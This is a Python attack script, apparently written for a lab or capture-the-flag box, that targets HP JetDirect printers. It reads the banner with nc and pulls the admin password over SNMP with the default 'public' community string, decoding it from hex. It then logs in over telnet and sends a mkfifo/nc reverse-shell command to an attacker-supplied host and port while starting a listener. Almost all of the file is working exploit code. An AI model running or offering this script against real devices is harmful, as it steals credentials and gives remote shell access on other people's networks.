#!/usr/bin/env python3

import os
import sys
import argparse
import keyboard
import webbrowser
import time
import getpass
import telnetlib

try:
	from colorama import Fore
except ImportError:
	os.system("pip3 install colorama")
	os.system("pip install colorama")
try:
	from pwn import *
except ImportError:
	os.system("pip3 install pwn")
	os.system("pip install pwn")

RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
RESET = Fore.RESET

parser = argparse.ArgumentParser(description="HP JetDirect Password Finder then Exploit", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("-t", "--Target", action="store", help="IP of target")
parser.add_argument("-r", "--RPORT", action="store", help="RPORT ex 9100")
parser.add_argument("-l", "--LHOST", action="store", help="LHOST (attacker IP)")
parser.add_argument("-p", "--LPORT", action="store", help="LPORT (attacker listening port)")
parser.add_argument("-w", "--Password", action="store", help="Login Password")
help_text = print(MAGENTA+"First run: python3 JetDirect.py -t 192.168.1.1 -r 23")
help_text2 = print("Then run: python3 JetDirect.py -t 192.168.1.1 -r 23 -l 192.168.100.2 -p 4444 -w password123!@#"+RESET)
help_text
help_text2
args = parser.parse_args()

Target = args.Target
RPORT = args.RPORT
LHOST = args.LHOST
LPORT = args.LPORT
Password = args.Password

if (Target == None or RPORT == None):
	print(YELLOW+"What do you want from me!!!"+RESET)
	parser.print_help()
	sys.exit()

if (Target != None and RPORT != None and LHOST == None and LPORT == None and Password == None):
	print(RED+"Please Press enter three times, do not press ctrl+c"+RESET)
	nc = os.system("nc "+Target+" "+RPORT+" > nc.txt")
	print(nc)
	print(YELLOW+"Saved information in nc.txt"+RESET)
	word = 'JetDirect'
	with open('nc.txt', 'r') as file:
		content = file.read()
		if word in content:
			print(GREEN+'HP JetDirect found, trying to exploit'+RESET)
			print(YELLOW+'Dropping password in hex format, hex needed is after BITS'+RESET)
			hex_pass = os.system("snmpget -v 1 -c public "+Target+" .1.3.6.1.4.1.11.2.3.9.1.1.13.0")
			print(hex_pass)
			hex_pass_cp = input("Copy and paste everything behind BITS: \n")
			print(bytearray.fromhex(hex_pass_cp).replace(b"\n",b"")[:34].decode())
			#url = "https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')"
			#webbrowser.get('firefox').open(url)
		else:
			print(RED+'HP JetDirect Not found, you may have the wrong port'+RESET)
	
if (Target != None and RPORT != None and LHOST != None and LPORT != None and Password != None):
	tn = telnetlib.Telnet(Target)
	print(MAGENTA+"Exploiting to create reverse shell"+RESET)
	print(YELLOW+"Please enter password "+Password+""+RESET)
	tn.write(b"\n")
	#tn.read_until(b"Password: ")
	time.sleep(1)
	tn.write(Password.encode('ascii') + b"\n")
	code = "exec rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "+LHOST+" "+LPORT+" >/tmp/f" 
	tn.write(code.encode('ascii') + b"\n")
	os.system("nc -lvnp "+LPORT)
	print (tn.read_all().decode('ascii'))

#string = "iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114   +++115 119 122 123 126 130 131 134 135"
#
#s = string.split("BITS: ")
## need to grab first 34 for the password hex
#
#print(bytearray.fromhex(s[1].replace(" ", "")[:34]).decode())

